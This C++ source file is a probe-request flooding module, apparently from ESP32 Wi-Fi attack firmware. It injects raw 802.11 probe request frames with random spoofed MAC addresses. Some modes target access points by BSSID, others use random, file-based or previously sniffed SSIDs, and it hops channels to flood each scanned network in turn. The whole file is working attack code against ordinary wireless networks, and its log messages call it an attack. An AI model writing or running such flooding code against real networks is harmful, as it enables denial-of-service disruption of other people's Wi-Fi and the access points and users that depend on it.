#include "ProbeFlooder.h"
#include "App.h"
#include "Logger.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "Config.h"
#include <algorithm>

ProbeFlooder::ProbeFlooder() :
    app_(nullptr),
    isActive_(false),
    currentMode_(ProbeFloodMode::RANDOM),
    currentChannel_(1),
    fileSsidReader_(),
    packetCounter_(0),
    autoPinpointState_(AutoPinpointState::SCANNING),
    currentTargetIndex_(-1),
    lastTargetHopTime_(0),
    lastScanCount_(0),
    sniffedSsidIndex_(0),
    lastChannelHopTime_(0),
    channelHopIndex_(0)
{}

ProbeFlooder::~ProbeFlooder() {}

void ProbeFlooder::setup(App* app) {
    app_ = app;
}

bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, ProbeFloodMode mode) {
    if (isActive_) return false;
    if (!rfLock || !rfLock->isValid()) {
        LOG(LogLevel::ERROR, "PROBE_FLOOD", "Failed to acquire RF hardware lock.");
        return false;
    }
    rfLock_ = std::move(rfLock);
    
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Starting Probe Flood. Mode: %d", (int)mode);
    currentMode_ = mode;
    packetCounter_ = 0;
    
    if (currentMode_ == ProbeFloodMode::FILE_BASED) {
        fileSsidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
        if (!fileSsidReader_.isOpen()) {
            LOG(LogLevel::ERROR, "PROBE_FLOOD", "SSID file is invalid or not found.");
            rfLock_.reset();
            return false;
        }
    } else if (currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
        if (!SdCardManager::exists(SD_ROOT::DATA_PROBES_SSID_SESSION)) {
            LOG(LogLevel::ERROR, "PROBE_FLOOD", "Sniffed SSID file not found. Run Probe Sniffer first.");
            rfLock_.reset();
            return false;
        }
        auto reader = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
        sniffedSsids_.clear();
        while(reader.isOpen()) {
            String line = reader.readLine();
            if (line.isEmpty()) break;
            sniffedSsids_.push_back(line.c_str());
        }
        if (sniffedSsids_.empty()) {
             LOG(LogLevel::ERROR, "PROBE_FLOOD", "Sniffed SSID file is empty.");
             rfLock_.reset();
             return false;
        }
        sniffedSsidIndex_ = 0;
    }
    
    if (currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
        autoPinpointState_ = AutoPinpointState::SCANNING;
        channelHopIndex_ = 0;
        currentTargetIndex_ = -1;
        currentTargetsOnChannel_.clear();
        lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
        currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
        app_->getWifiManager().startScanOnChannel(currentChannel_);
    } else {
        channelHopIndex_ = 0;
        currentChannel_ = Channels::WIFI_2_4GHZ[0];
        esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
        lastChannelHopTime_ = millis();
    }

    isActive_ = true;
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Attack started.");
    return true;
}

bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, const WifiNetworkInfo& targetNetwork) {
    if (isActive_) return false;
    if (!rfLock || !rfLock->isValid()) {
        LOG(LogLevel::ERROR, "PROBE_FLOOD", "Failed to acquire RF hardware lock for pinpoint attack.");
        return false;
    }
    rfLock_ = std::move(rfLock);

    LOG(LogLevel::INFO, "PROBE_FLOOD", "Starting PINPOINT Probe Flood on %s (CH: %ld)", targetNetwork.ssid, targetNetwork.channel);

    currentMode_ = ProbeFloodMode::PINPOINT_AP;
    targetAp_ = targetNetwork;
    packetCounter_ = 0;

    esp_wifi_set_channel(targetAp_.channel, WIFI_SECOND_CHAN_NONE);
    currentChannel_ = targetAp_.channel;
    
    isActive_ = true;
    return true;
}

void ProbeFlooder::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Stopping probe flood attack.");
    isActive_ = false;
    fileSsidReader_.close();
    sniffedSsids_.clear();
    rfLock_.reset();
}

void ProbeFlooder::loop() {
    if (!isActive_) return;
    
    switch (currentMode_) {
        case ProbeFloodMode::RANDOM:
        case ProbeFloodMode::FILE_BASED: {
            for (int i = 0; i < 20; ++i) {
                std::string ssid = getNextSsid();
                if (!ssid.empty()) {
                    sendProbePacket(ssid);
                    packetCounter_++;
                } else if (currentMode_ == ProbeFloodMode::FILE_BASED) {
                    fileSsidReader_.close();
                    fileSsidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
                }
            }
            if (millis() - lastChannelHopTime_ > 250) {
                channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
                currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
                esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
                lastChannelHopTime_ = millis();
            }
            break;
        }

        case ProbeFloodMode::PINPOINT_AP: {
            for (int i = 0; i < 20; ++i) {
                sendProbePacket(getNextSsid());
                packetCounter_++;
            }
            break;
        }

        case ProbeFloodMode::AUTO_BROADCAST_PINPOINT:
        case ProbeFloodMode::AUTO_SNIFFED_PINPOINT: {
            if (autoPinpointState_ == AutoPinpointState::SCANNING) {
                if (app_->getWifiManager().getScanCompletionCount() > lastScanCount_) {
                    lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
                    currentTargetsOnChannel_ = app_->getWifiManager().getScannedNetworks();
                    currentTargetIndex_ = 0;
                    autoPinpointState_ = AutoPinpointState::FLOODING;
                    lastTargetHopTime_ = millis();
                    LOG(LogLevel::INFO, "PROBE_FLOOD", "Scan on CH %d complete. Found %d targets.", currentChannel_, currentTargetsOnChannel_.size());
                }
            } else if (autoPinpointState_ == AutoPinpointState::FLOODING) {
                if (millis() - lastChannelHopTime_ > 5000) { // Flood on one channel for 5 seconds
                    channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
                    currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
                    lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
                    app_->getWifiManager().startScanOnChannel(currentChannel_);
                    autoPinpointState_ = AutoPinpointState::SCANNING;
                    LOG(LogLevel::INFO, "PROBE_FLOOD", "Hopping to next channel. Now scanning CH %d.", currentChannel_);
                    return;
                }

                if (currentTargetsOnChannel_.empty()) return;

                if (millis() - lastTargetHopTime_ > 500) { // Flood one AP for 500ms
                    currentTargetIndex_ = (currentTargetIndex_ + 1) % currentTargetsOnChannel_.size();
                    lastTargetHopTime_ = millis();
                }

                for (int i = 0; i < 20; ++i) {
                    sendProbePacket(getNextSsid());
                    packetCounter_++;
                }
            }
            break;
        }
    }
}

std::string ProbeFlooder::getNextSsid() {
    if (currentMode_ == ProbeFloodMode::FILE_BASED) {
        return fileSsidReader_.readLine().c_str();
    } else if (currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
        if (sniffedSsids_.empty()) return "";
        std::string ssid = sniffedSsids_[sniffedSsidIndex_];
        sniffedSsidIndex_ = (sniffedSsidIndex_ + 1) % sniffedSsids_.size();
        return ssid;
    } else { // RANDOM, PINPOINT_AP, and AUTO_BROADCAST_PINPOINT use random SSIDs
        char random_buffer[17];
        const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        int ssid_len = 8 + (esp_random() % 9);
        for (int i = 0; i < ssid_len; ++i) {
            random_buffer[i] = charset[esp_random() % (sizeof(charset) - 2)];
        }
        random_buffer[ssid_len] = '\0';
        return random_buffer;
    }
}

void ProbeFlooder::sendProbePacket(const std::string& ssid) {
    if (ssid.empty()) return;
    uint8_t packet_buffer[128];
    memcpy(packet_buffer, RawFrames::Mgmt::ProbeRequest::TEMPLATE, sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE));

    if (currentMode_ == ProbeFloodMode::PINPOINT_AP || currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
        const WifiNetworkInfo* currentTarget = nullptr;
        if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
            currentTarget = &targetAp_;
        } else if (!currentTargetsOnChannel_.empty() && currentTargetIndex_ < currentTargetsOnChannel_.size()) {
            currentTarget = &currentTargetsOnChannel_[currentTargetIndex_];
        }

        if (currentTarget) {
            memcpy(&packet_buffer[4], currentTarget->bssid, 6);
            memcpy(&packet_buffer[16], currentTarget->bssid, 6);
        }
    }

    for (int i = 0; i < 6; i++) {
        packet_buffer[10 + i] = esp_random() & 0xFF;
    }
    packet_buffer[10] = (packet_buffer[10] & 0xFE) | 0x02;

    uint8_t ssid_len = std::min((int)ssid.length(), 32);
    
    uint8_t* p = packet_buffer + sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE);
    *p++ = 0; *p++ = ssid_len;
    memcpy(p, ssid.c_str(), ssid_len);
    p += ssid_len;
    
    memcpy(p, RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS, sizeof(RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS));
    p += sizeof(RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS);

    int total_len = p - packet_buffer;
    esp_wifi_80211_tx(WIFI_IF_STA, packet_buffer, total_len, false);
}

bool ProbeFlooder::isActive() const { return isActive_; }
uint32_t ProbeFlooder::getPacketCounter() const { return packetCounter_; }
int ProbeFlooder::getCurrentChannel() const { return currentChannel_; }
ProbeFloodMode ProbeFlooder::getMode() const { return currentMode_; }
AutoPinpointState ProbeFlooder::getAutoPinpointState() const { return autoPinpointState_; }

const std::string ProbeFlooder::getCurrentTargetSsid() const {
    if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
        return targetAp_.ssid;
    }
    if ((currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) 
        && !currentTargetsOnChannel_.empty() && currentTargetIndex_ < currentTargetsOnChannel_.size()) {
        return currentTargetsOnChannel_[currentTargetIndex_].ssid;
    }
    return "N/A";
}